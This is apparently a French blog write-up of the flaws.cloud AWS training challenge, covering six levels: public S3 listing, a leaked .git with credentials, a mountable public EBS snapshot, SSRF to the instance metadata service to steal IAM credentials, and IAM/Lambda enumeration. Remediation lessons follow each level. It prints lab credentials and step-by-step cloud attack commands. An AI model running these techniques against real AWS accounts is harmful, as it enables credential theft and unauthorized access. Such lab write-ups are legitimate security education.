---
title: "flaws.cloud walkthrough : 6 misconfiguration AWS à ne pas reproduire"
date: 2026-05-23
tags: [flaws.cloud, aws, s3, iam, imds, ebs, git, cloud-pentest, débutant]
categories: ["write-up"]
description: "Du bucket public à l'IMDS en passant par un snapshot EBS et un repo git exposé : six erreurs de configuration AWS réelles, une après-midi de galère, et beaucoup de choses apprises."
readtime: 14
draft: false
---

# flaws.cloud walkthrough : 6 misconfiguration AWS à ne pas reproduire

Six niveaux. Six erreurs de configuration différentes. Toutes réelles, toutes documentées dans des incidents qui ont coûté cher à de vraies entreprises.

[flaws.cloud](http://flaws.cloud) est un challenge créé par Scott Piper pour apprendre les misconfiguration AWS par la pratique. Le principe est simple : chaque niveau expose une vulnérabilité classique, et pour passer au suivant il faut l'exploiter. Ce write-up couvre les 6 niveaux avec les fausses pistes, les moments de confusion, et les fois où j'ai cherché dans la mauvaise direction pendant trop longtemps. Parce que c'est là que l'apprentissage se passe vraiment.

---

## Level 1 : le bucket S3 listé pour tout le monde

![Page d'accueil flaws.cloud](../../images/flaws-cloud/level1-homepage.png)

L'indice du level : "this level is *buckets* of fun. See if you can find the first sub-domain."

Quand un site est hébergé sur S3, le bucket porte souvent le même nom que le domaine. Bon. Il faut donc accéder au bucket `flaws.cloud` via une URL.

Et là, première erreur bête : j'ai essayé `s3://flaws.cloud/` dans le navigateur. Résultat : rien. Évidemment. `s3://` c'est un protocole CLI, pas HTTP. C'est l'équivalent de taper `ssh://monserveur` dans Chrome. Ça ne peut pas marcher : le navigateur ne sait pas ce que c'est.

Ce qu'il faut, c'est le format HTTP de S3, appelé "virtual-hosted-style" :

```
http://[nom-du-bucket].s3.amazonaws.com
```

Donc :

```bash
curl http://flaws.cloud.s3.amazonaws.com/
```

![Listing XML du bucket level 1](../../images/flaws-cloud/level1-bucket-listing.png)

AWS répond avec un XML qui liste tous les fichiers du bucket. On voit `secret-dd02c7c.html`. On enum `http://flaws.cloud/secret-dd02c7c.html`.

![Flag level 1](../../images/flaws-cloud/level1-flag.png)

Level 1, plié.

> **Leçon :** Par défaut, un bucket S3 est privé. Pour héberger un site statique, la permission `s3:GetObject` public suffit : les gens peuvent lire les fichiers dont ils connaissent l'URL. Activer `s3:ListBucket` pour "Everyone" c'est différent : ça permet de lister tous les fichiers, comme un directory listing de serveur web mal configuré. Ce n'est pas la même chose, et l'un est beaucoup plus dangereux que l'autre.

---

## Level 2 : le bucket listé pour n'importe quel compte AWS

![AccessDenied level 2](../../images/flaws-cloud/level2-access-denied.png)

Même approche. Cette fois AWS retourne `AccessDenied`. Le level dit qu'on a besoin d'un compte AWS.

Et là, j'ai fait une erreur assez mémorable.

Dans la réponse XML du `AccessDenied`, il y avait des champs avec de longues chaînes de caractères : `RequestId` et `HostId`. Ça ressemblait vaguement à des credentials. J'ai configuré un profil AWS avec ces valeurs comme AccessKeyId et SecretAccessKey.

```bash
aws s3 ls s3://level2-[...].flaws.cloud --profile flaws
# InvalidAccessKeyId: The AWS Access Key Id you provided does not exist
```

Normal. Ce sont des identifiants de requête interne d'AWS, pas des access keys. Les vraies access keys commencent toujours par `AKIA` (credentials long terme) ou `ASIA` (credentials temporaires). Si ça ne commence pas par là, c'est pas une access key.

Bonne approche : créer un utilisateur IAM dans son propre compte avec `AmazonS3ReadOnlyAccess`, configurer le profil, relancer.

```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile flaws
```

![s3 ls level 2 success](../../images/flaws-cloud/level2-s3-ls.png)

`secret-e4443fc.html`. Let's go.

![Flag level 2](../../images/flaws-cloud/level2-flag.png)

> **Leçon :** "Authenticated AWS Users" dans les permissions S3 ne veut pas dire "mes utilisateurs". Ça veut dire n'importe quel compte AWS dans le monde entier. Environ 300 millions de comptes actifs. Autant dire public. Ce paramètre est un piège classique pour les gens qui pensent que "authentifié" implique "de confiance".

---

## Level 3 : le repo git dans le bucket

Le bucket du level 3 est listé sans authentification. Son contenu est bizarre :

```
PRE .git/
    authenticated_users.png
    hint1.html
    ...
```

Un répertoire `.git/` complet dans un bucket S3, accessible publiquement. On sync tout en local :

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --profile flaws
```

Quelques warnings sur des fichiers skippés (les git objects avec des caractères spéciaux dans les paths). L'essentiel est là quand même. On inspecte l'historique :

```bash
git log
```

```
commit b64c8dc  Oops, accidentally added something I shouldn't have
commit f52ec03  first commit
```

Le message du commit parle de lui-même. Deux commits. On regarde ce qui a changé :

```bash
git diff f52ec03 b64c8dc
```

![git log et git diff level 3](../../images/flaws-cloud/level3-git-diff.png)

```diff
-access_key AKIA************
-secret_access_key ************************************
```

Des credentials AWS dans l'historique. On configure le profil et on regarde ce à quoi elles donnent accès :

```bash
aws sts get-caller-identity --profile level3
# "Arn": "arn:aws:iam::************:user/backup"

aws s3 ls --profile level3
```

![Tous les buckets du compte](../../images/flaws-cloud/level3-all-buckets.png)

Tous les buckets du compte de Scott apparaissent. Levels 4, 5, 6 et même `theend`. Le user `backup` voit tout le compte.

> **Leçon :** Supprimer un fichier d'un commit ne supprime pas ses données. Elles restent dans l'historique git indéfiniment. Si des credentials ont touché un repo, il faut les révoquer immédiatement, peu importe si elles ont été supprimées ensuite. Et un `.git/` dans un bucket S3 public, c'est une idée catastrophique.

---

## Level 4 : le snapshot EBS public

![Page de connexion nginx level 4](../../images/flaws-cloud/level4-nginx-auth.png)

Une EC2 tourne avec une page nginx protégée par mot de passe. L'indice : "a snapshot was made of that EC2 shortly after nginx was setup on it."

Honnêtement, là j'ai bloqué un moment. Je savais ce qu'était un snapshot EBS en théorie, mais je n'avais pas immédiatement tilté que ça pouvait me donner accès à des fichiers de l'instance. Dans ma tête, un snapshot c'était une sauvegarde pour relancer une instance, pas quelque chose qu'on pouvait monter pour lire le contenu du disque.

Après quelques recherches, le mécanisme devient clair : un snapshot EBS c'est une image complète d'un disque. Si on crée un volume depuis ce snapshot et qu'on le monte sur sa propre EC2, on peut naviguer dans les fichiers comme si on avait accès direct au serveur de Scott. Fichiers de config, scripts de déploiement, logs, tout.

On cherche les snapshots du compte avec les credentials du level 3 :

```bash
aws ec2 describe-snapshots \
  --owner-ids ************ \
  --region us-west-2 --profile level3
# "SnapshotId": "snap-0b49342abd1bdcb89", "Encrypted": false
```

On vérifie les permissions :

```bash
aws ec2 describe-snapshot-attribute \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --attribute createVolumePermission \
  --region us-west-2 --profile level3
# "Group": "all"
```

`all` : n'importe qui peut créer un volume depuis ce snapshot. On lance une EC2 dans son propre compte en `us-west-2`, on crée le volume, on attache, on monte.

**Fausse piste sur l'availability zone :** première tentative avec `--availability-zone us-west-2a` alors que l'instance était en `us-west-2c`. Erreur `ZoneMismatch`. Un volume EBS doit être dans la même AZ que l'instance. Toujours vérifier avant de créer :

```bash
aws ec2 describe-instances \
  --instance-ids i-[...] \
  --query 'Reservations[0].Instances[0].Placement.AvailabilityZone'
# "us-west-2c"
```

```bash
sudo mount /dev/xvdf1 /mnt/flaws
ls /mnt/flaws/etc/nginx/
```

![.htpasswd nginx level 4](../../images/flaws-cloud/level4-htpasswd.png)

Le `.htpasswd` contient un hash APR1-MD5. Et là, j'ai perdu une heure.

J'étais convaincu qu'il fallait cracker le hash. J'ai essayé john avec rockyou, pas de résultat. Hashcat en mode 1600 (APR1-MD5), toute la wordlist rockyou passée, rien. Crackstation, idem. Une heure à chercher un mot de passe dans une wordlist alors que la vraie réponse était ailleurs sur le disque.

En fouillant le home directory de l'utilisateur ubuntu :

![setupNginx.sh avec le mot de passe](../../images/flaws-cloud/level4-setup-password.png)

```bash
cat /mnt/flaws/home/ubuntu/setupNginx.sh
# htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

Le mot de passe en clair dans le script de setup, jamais supprimé du disque depuis 2017. Il était là depuis le début.

> **Leçon :** Un snapshot EBS n'est pas juste une sauvegarde de données métier. C'est une photo du disque entier : scripts de déploiement, historique bash, fichiers temporaires, credentials en dur dans les scripts de setup. Ne pas exposer les snapshots publiquement, chiffrer les volumes EBS, et ne jamais mettre de secrets dans des scripts de configuration.

---

## Level 5 : vol de credentials via l'IMDS

L'EC2 du level 4 fait tourner un proxy HTTP. Des exemples d'usage sont donnés, du genre :

```
http://[ec2-url]/proxy/flaws.cloud/
http://[ec2-url]/proxy/summitroute.com/blog/feed.xml
```

L'objectif : utiliser ce proxy pour trouver le contenu caché dans le bucket level 6.

Ce proxy fait des requêtes HTTP depuis l'intérieur d'une EC2. Ce qui est accessible depuis une EC2 AWS mais pas depuis l'extérieur : l'IMDS (Instance Metadata Service), sur l'IP `169.254.169.254`. C'est une adresse réservée présente chez AWS, Azure et GCP. Elle donne accès aux métadonnées de l'instance, dont les credentials IAM temporaires du rôle attaché.

J'avais de la chance : j'avais fait un scenario CloudGoat similaire quelques semaines avant ([data_secrets](/posts/writeup-data-secrets/)) qui exploite exactement le même vecteur. Sans ça j'aurais probablement mis beaucoup plus de temps à faire le lien entre "proxy HTTP" et "vol de credentials IMDS".

Un détail que j'avais pas vu en arrivant sur le challenge : dès la page d'accueil, dans la section "Greetz", Scott remercie [Nicolas Grégoire](https://www.agarri.fr/) ([@Agarri_FR](https://twitter.com/Agarri_FR)) pour ses conseils et ses idées dans la construction du challenge lui-même. Pas juste une mention : une contribution directe. Je ne m'y attendais pas du tout. J'avais eu la chance d'assister à une de ses confs à [Hack'In](https://hackin.fr) à Aix-en-Provence il y a quelque temps, et voir son nom crédité ici m'a fait sourire. Ce genre de détail rappelle que la communauté sécu FR pèse vraiment à l'international.

On navigue vers :

```
http://[ec2-url]/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

![IMDS listing via proxy](../../images/flaws-cloud/level5-imds-listing.png)

![Credentials IMDS level 5](../../images/flaws-cloud/level5-imds-creds.png)

`AccessKeyId`, `SecretAccessKey`, `Token` : credentials IAM temporaires du rôle de l'EC2. On configure le profil avec les trois valeurs (le Token est obligatoire pour les credentials temporaires) et on liste le bucket level 6 :

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile level5
# PRE ddcc78ff/
```

Répertoire caché. Let's go.

> **Leçon :** IMDSv1 répond à n'importe quelle requête HTTP sans header spécial. N'importe quel proxy, toute vulnérabilité SSRF, tout service qui fait des requêtes HTTP depuis une EC2 peut devenir un vecteur de vol de credentials. IMDSv2 corrige ça en exigeant un token de session obtenu via une requête PUT préalable. À activer systématiquement sur toutes les instances.

---

## Level 6 : énumération IAM et API Gateway

Les credentials du level 6 sont donnés directement sur la page. On commence par s'identifier :

```bash
aws configure --profile level6
# AccessKeyId: AKIAJFQ6E7BY57Q3OBGA
# SecretAccessKey: ****

aws sts get-caller-identity --profile level6
```

```json
{
  "UserId": "AIDAIRMDOSCWGLCDWOG6A",
  "Account": "************",
  "Arn": "arn:aws:iam::************:user/Level6"
}
```

On liste les policies attachées à ce user :

```bash
aws iam list-attached-user-policies --user-name Level6 --profile level6
```

```json
{
  "AttachedPolicies": [
    { "PolicyName": "MySecurityAudit" },
    { "PolicyName": "list_apigateways" }
  ]
}
```

Deux policies. On regarde `list_apigateways` en premier puisque le nom est explicite :

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::************:policy/list_apigateways \
  --version-id v1 --profile level6
```

```json
"Action": ["apigateway:GET"],
"Resource": "arn:aws:execute-api:us-west-2:************:puspzvwgb6/*"
```

La permission est sur un ID spécifique, pas sur le listing global. Premier réflexe : essayer de lister les APIs.

```bash
aws apigateway get-rest-apis --profile level6 --region us-west-2
# AccessDeniedException
```

Bloqué. La permission cible `execute-api`, pas `apigateway:/restapis`. Du coup on change d'approche. `MySecurityAudit` donne des droits en lecture sur énormément de services. Lambda en fait partie.

```bash
aws lambda list-functions --profile level6 --region us-west-2
```

```json
{
  "FunctionName": "Level6",
  "FunctionArn": "arn:aws:lambda:us-west-2:************:function:Level6",
  "Runtime": "python2.7"
}
```

Une Lambda `Level6`. On inspecte sa policy d'invocation :

```bash
aws lambda get-policy --function-name Level6 --profile level6 --region us-west-2
```

```json
{
  "Sid": "904610a93f593b76ad66ed6ed82c0a8b",
  "Effect": "Allow",
  "Principal": { "Service": "apigateway.amazonaws.com" },
  "Action": "lambda:InvokeFunction",
  "Condition": {
    "ArnLike": {
      "AWS:SourceArn": "arn:aws:execute-api:us-west-2:************:s33ppypa75/*/GET/level6"
    }
  }
}
```

L'API ID est là : `s33ppypa75`. Le path : `/level6`. Il nous manque le stage de déploiement. On peut le récupérer parce que la permission `list_apigateways` couvre cet ID :

```bash
aws apigateway get-stages \
  --rest-api-id s33ppypa75 \
  --profile level6 --region us-west-2
```

```json
{ "stageName": "Prod" }
```

URL finale : `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`

![Réponse API level 6](../../images/flaws-cloud/level6-api-response.png)

La Lambda retourne l'URL du theend. On y va.

![The End](../../images/flaws-cloud/level6-the-end.png)

> **Leçon :** Une policy "read-only" comme SecurityAudit permet de cartographier entièrement un compte AWS : users, roles, policies, Lambdas, API Gateways, tout. C'est suffisant pour construire un chemin d'attaque complet. Les permissions de lecture ne sont pas anodines. `lambda:GetPolicy` seul peut révéler l'infrastructure qu'un attaquant cherche. Least privilege s'applique aussi aux droits d'audit.

---

## Chaîne complète

```
flaws.cloud (hébergé sur S3)
  │
  ├── L1 : s3:ListBucket pour Everyone
  │         → listing de tous les fichiers → secret-dd02c7c.html
  │
  ├── L2 : s3:ListBucket pour Authenticated AWS Users
  │         → listing avec n'importe quel compte AWS → secret-e4443fc.html
  │
  ├── L3 : .git/ exposé dans bucket public
  │         → historique git → credentials user/backup → listing compte entier
  │
  ├── L4 : snapshot EBS public + non chiffré
  │         → mount sur EC2 perso → setupNginx.sh → mot de passe nginx en clair
  │
  ├── L5 : proxy HTTP + IMDSv1 sans restriction
  │         → 169.254.169.254 → credentials IAM temporaires → bucket level 6
  │
  └── L6 : SecurityAudit + lambda:GetPolicy
            → API Gateway ID + stage → Lambda Level6 → theend
```

---

## Bilan

| Level | Vulnérabilité | Impact | Remédiation |
|-------|--------------|--------|-------------|
| 1 | `s3:ListBucket` pour Everyone | Listing complet des fichiers | Supprimer la permission ListBucket publique |
| 2 | `s3:ListBucket` pour Authenticated AWS Users | Listing par n'importe quel compte AWS | Restreindre à des identités spécifiques |
| 3 | `.git/` dans bucket public, credentials dans l'historique | Accès complet au compte AWS | Pas de `.git` dans S3, rotation immédiate des credentials exposées |
| 4 | Snapshot EBS public, non chiffré, secrets dans scripts | Récupération de mots de passe et données sensibles | Chiffrer EBS, snapshots privés, pas de secrets dans les scripts |
| 5 | IMDSv1 sans restriction, proxy sans filtrage IP | Vol de credentials IAM temporaires | Activer IMDSv2, bloquer `169.254.169.254` depuis les apps |
| 6 | SecurityAudit trop permissif, lambda:GetPolicy lisible | Cartographie complète + chemin vers l'infrastructure | Least privilege même sur les droits read-only |

Ce qui frappe en faisant ce challenge, c'est que la plupart de ces erreurs ne sont pas des bugs. Ce sont des choix. Quelqu'un a activé `ListBucket` pour "Everyone" parce que c'était plus simple. Quelqu'un a laissé un snapshot public pour y accéder depuis un autre compte. Quelqu'un a gardé IMDSv1 parce que changer aurait peut-être cassé quelque chose. Des compromis qui semblent raisonnables sur le moment et qui deviennent des vecteurs d'attaque plus tard.

Faire [flaws.cloud](http://flaws.cloud) en une après-midi, c'est voir six de ces compromis s'enchaîner en vrai. C'est très différent de lire une liste de bonnes pratiques. La configuration du bucket level 2 sur la leçon learned, ça aurait été abstrait. Après l'avoir exploitée, ça ne l'est plus du tout.

J'ai adoré ce challenge. Le level 4 avec le snapshot m'a particulièrement appris quelque chose : j'aurais jamais pensé à monter un disque pour récupérer des credentials avant de le faire. Maintenant c'est câblé.

La suite : [flaws2.cloud](http://flaws2.cloud) qui couvre d'autres scénarios. Restez branchés 👀

---

## MITRE ATT&CK

| Technique | ID | Level |
|-----------|-----|-------|
| Cloud Storage Object Discovery | T1619 | L1, L2, L3 |
| Unsecured Credentials in Files | T1552.001 | L3, L4 |
| Cloud Instance Metadata API | T1552.005 | L5 |
| Cloud Infrastructure Discovery | T1580 | L4, L6 |
| Valid Accounts (Cloud) | T1078.004 | L2, L3, L5, L6 |
